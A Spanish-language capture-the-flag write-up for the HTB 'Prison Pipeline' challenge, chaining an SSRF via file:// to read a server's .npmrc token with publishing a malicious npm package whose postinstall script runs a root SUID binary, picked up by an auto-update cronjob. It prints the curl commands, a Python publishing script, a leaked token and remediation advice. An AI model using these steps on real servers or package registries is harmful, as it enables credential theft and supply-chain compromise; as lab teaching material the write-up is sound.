# Prison Pipeline - Writeup

## Descripción

> One of our crew members has been captured by mutant raiders and is locked away in their heavily fortified prison. During an initial reconnaissance, the crew managed to gain access to the prison's record management system. Your mission: exploit this system to infiltrate the prison's network and disable the defenses for the rescuers. Can you orchestrate the perfect escape and rescue your comrade before it's too late?

**IP:** `154.57.164.83:31740`  
**Categoría:** Misc  
**Dificultad:** Media

---

## Arquitectura del Challenge

```
                        ┌─────────────────────────────────────┐
                        │          Nginx (puerto 1337)         │
                        │                                     │
                        │  Host: registry.prison-pipeline.htb │
                        │  ──────────────────────────────►    │
                        │         localhost:4873 (Verdaccio)   │
                        │                                     │
                        │  Host: cualquier otro                │
                        │  ──────────────────────────────►    │
                        │         localhost:5000 (App Node)    │
                        └─────────────────────────────────────┘
                                  │              ▲
                                  ▼              │
                         ┌──────────────┐   ┌────────────────┐
                         │  Verdaccio   │   │   App Node.js  │
                         │  npm registry│   │  (Express)     │
                         │  puerto 4873 │   │  puerto 5000   │
                         └──────────────┘   └────────────────┘
                                                     │
                                                     ▼
                                            ┌──────────────────┐
                                            │  prisoner-db     │
                                            │  (npm package)   │
                                            │  v1.0.0          │
                                            └──────────────────┘
```

### Componentes

| Componente | Rol |
|---|---|
| **Nginx** | Proxy inverso, puerto 1337. Enruta por Host header |
| **App Node.js** | Express en puerto 5000. CRUD de prisioneros + importación por URL |
| **Verdaccio** | Registro npm privado en puerto 4873 |
| **Cronjob** | Cada 30s verifica actualizaciones de `prisoner-db` y ejecuta `npm update` |
| **readflag** | Binario SUID root (4755) en `/readflag`. Ejecuta `cat /root/flag` |

### Rutas de la API

| Método | Ruta | Descripción |
|---|---|---|
| `GET` | `/` | Página principal |
| `GET` | `/api/prisoners` | Listar todos los prisioneros |
| `GET` | `/api/prisoners/:id` | Obtener detalle de prisionero |
| `POST` | `/api/prisoners/import` | **Importar prisionero desde URL (SSRF)** |

---

## Vulnerabilidades Identificadas

### 1. SSRF (Server-Side Request Forgery)

**Archivo:** `challenge/prisoner-db/index.js:76-95`

```javascript
async importPrisoner(url) {
    const getResponse = await curl.get(url);  // node-libcurl
    const xmlData = getResponse.body;
    // ...
}
```

**Archivo:** `challenge/prisoner-db/curl.js:37`

```javascript
curl.setOpt(Curl.option.FOLLOWLOCATION, true);
```

`node-libcurl` soporta el protocolo `file://`, permitiendo leer archivos locales del servidor.

### 2. Dependency Confusion / Supply Chain Attack

**Archivo:** `config/cronjob.sh`

```bash
while true; do
    OUTDATED=$(npm --registry $REGISTRY_URL outdated $PACKAGE_NAME)
    if [[ -n "$OUTDATED" ]]; then
        npm --registry $REGISTRY_URL update $PACKAGE_NAME
        pm2 restart prison-pipeline
    fi
    sleep 30
done
```

Cada 30 segundos verifica si hay una versión más nueva de `prisoner-db` en el registro y la instala automáticamente.

### 3. Postinstall Script Injection

npm ejecuta scripts definidos en `package.json` durante `install`/`update`, como `postinstall`. Esto permite ejecución arbitraria de comandos.

---

## Exploit - Paso a Paso

### Paso 1: SSRF para leer `.npmrc`

El endpoint `/api/prisoners/import` acepta una URL y la descarga con `node-libcurl`. Como no hay restricción de protocolos, podemos leer archivos locales:

```bash
# Importar el archivo .npmrc via file://
curl -s -X POST http://154.57.164.83:31740/api/prisoners/import \
  -H "Content-Type: application/json" \
  -d '{"url":"file:///home/node/.npmrc"}'
```

Respuesta:
```json
{"message":"Prisoner data imported successfully","prisoner_id":"PIP-313048"}
```

### Paso 2: Recuperar el contenido

```bash
curl -s http://154.57.164.83:31740/api/prisoners/PIP-313048 | jq .
```

Respuesta relevante:
```
//localhost:4873/:_authToken="MWZlMmI1OTRiZjMwNTJkMjYwNWZhYTE1NGJlNTVjZDQ6OGRjNDBlMDE3YWNhYjViYzEwM2RlOTQzYzg3OWZiN2YwY2EyZGI5ZmMwMGI4ZWViZWVhZmUzZjc0Y2I2MWFiOTZmNWI1OWVhNTg0N2IwZmIwZQ=="
```

El token en base64 decodifica a `usuario:hash` pero se usa directamente como bearer token para autenticarse contra Verdaccio.

### Paso 3: Crear paquete malicioso

Creamos un paquete `prisoner-db` con versión superior (1.0.1) que ejecuta `/readflag` en su `postinstall`:

```json
{
  "name": "prisoner-db",
  "version": "1.0.1",
  "main": "lib/index.js",
  "scripts": {
    "postinstall": "/readflag > /app/static/flag.txt 2>&1"
  },
  "dependencies": {
    "js-yaml": "^4.1.0",
    "node-libcurl": "4.0.0"
  }
}
```

El binario `/readflag` es SUID root (4755), por lo que ejecuta `cat /root/flag` con privilegios de root y escribe la flag en el directorio estático.

### Paso 4: Publicar en Verdaccio

Necesitamos llegar al registro npm. Como Nginx enruta por `Host` header, debemos enviar peticiones a `154.57.164.83:31740` con `Host: registry.prison-pipeline.htb`.

**Opción A:** Agregar entrada en `/etc/hosts`:
```
154.57.164.83 registry.prison-pipeline.htb
```

**Opción B:** Usar curl con Host header manual.

La API de publicación de npm/Verdaccio usa `PUT /{package-name}` con el package.json y el tarball adjunto en base64 dentro de `_attachments`:

```python
# publish.py
import urllib.request, json, base64, tarfile, io

# 1. Crear tarball
buf = io.BytesIO()
with tarfile.open(fileobj=buf, mode='w:gz') as tar:
    tar.add('package.json', 'package/package.json')
    tar.add('lib/index.js', 'package/lib/index.js')
    tar.add('lib/curl.js', 'package/lib/curl.js')
tarball_b64 = base64.b64encode(buf.getvalue()).decode()

# 2. Payload de publicación
payload = {
    "_id": "prisoner-db",
    "name": "prisoner-db",
    "dist-tags": {"latest": "1.0.1"},
    "versions": {
        "1.0.1": {
            "name": "prisoner-db",
            "version": "1.0.1",
            "main": "lib/index.js",
            "scripts": {"postinstall": "/readflag > /app/static/flag.txt 2>&1"},
            "dependencies": {"js-yaml": "^4.1.0", "node-libcurl": "4.0.0"},
            "dist": {"tarball": "http://registry.prison-pipeline.htb:1337/prisoner-db/-/prisoner-db-1.0.1.tgz"}
        }
    },
    "_attachments": {
        "prisoner-db-1.0.1.tgz": {
            "content_type": "application/octet-stream",
            "data": tarball_b64,
            "length": len(buf.getvalue())
        }
    }
}

# 3. Enviar
req = urllib.request.Request(
    'http://registry.prison-pipeline.htb:31740/prisoner-db',
    data=json.dumps(payload).encode(),
    headers={
        'Authorization': 'Bearer MWZlMmI1OTRiZjMwNTJkMjYwNWZhYTE1NGJlNTVjZDQ6OGRjNDBlMDE3YWNhYjViYzEwM2RlOTQzYzg3OWZiN2YwY2EyZGI5ZmMwMGI4ZWViZWVhZmUzZjc0Y2I2MWFiOTZmNWI1OWVhNTg0N2IwZmIwZQ==',
        'Content-Type': 'application/json',
    },
    method='PUT'
)
resp = urllib.request.urlopen(req)
print(resp.status, resp.read())
```

Respuesta exitosa:
```
Status: 201
{"ok": "created new package", "success": true}
```

### Paso 5: Esperar al cronjob

El cronjob ejecuta cada 30 segundos:

1. `npm outdated prisoner-db` → Detecta que `1.0.1` es más nuevo
2. `npm update prisoner-db` → Descarga 1.0.1 y ejecuta `postinstall`
3. El script `postinstall` ejecuta `/readflag > /app/static/flag.txt`
4. `pm2 restart prison-pipeline` → Reinicia la app

### Paso 6: Recuperar la flag

```bash
sleep 35 && curl -s http://154.57.164.83:31740/static/flag.txt
```

```
HTB{pr1s0n_br34k_w1th_supply_ch41n!_75174f0bbab0395bf4afef3fd487e085}
```

---

## Flag

```
HTB{pr1s0n_br34k_w1th_supply_ch41n!_75174f0bbab0395bf4afef3fd487e085}
```

---

## Conceptos Clave

### SSRF (Server-Side Request Forgery)
- Ocurre cuando una app web acepta una URL y la descarga del lado del servidor
- `node-libcurl` con `FOLLOWLOCATION: true` y sin restricción de protocolos permite `file://`
- Se puede leer cualquier archivo accesible por el usuario `node`

### npm Supply Chain Attack
- Los registros npm privados permiten publicar paquetes con autenticación
- Si un sistema consume paquetes de un registro y alguien malicioso puede publicar, se puede inyectar código
- El ataque se combina con actualizaciones automáticas (cronjob)

### npm Postinstall Scripts
- npm ejecuta scripts definidos en `package.json` durante el ciclo de vida de instalación
- `postinstall` se ejecuta después de `npm install` o `npm update`
- Esto permite ejecución arbitraria de comandos con los permisos del usuario que ejecuta npm

### SUID Binaries
- `/readflag` tiene permisos `4755` (setuid root)
- `chmod 4755 /readflag` + propietario root → cualquier usuario lo ejecuta como root
- Patrón común en CTFs para leer flags protegidas

---

## Remediation

1. **Restringir protocolos en libcurl** - No permitir `file://`, `ftp://`, etc. Solo `http://` y `https://`
2. **Validar URLs** - Usar una whitelist de dominios permitidos
3. **Firmar paquetes npm** - Verificar integridad de paquetes antes de instalar
4. **No usar actualizaciones automáticas** - Deshabilitar el cronjob o requerir aprobación manual
5. **Ejecutar npm como usuario no privilegiado** - Ya se hace, pero el `postinstall` aún puede escribir en `/app/static/`
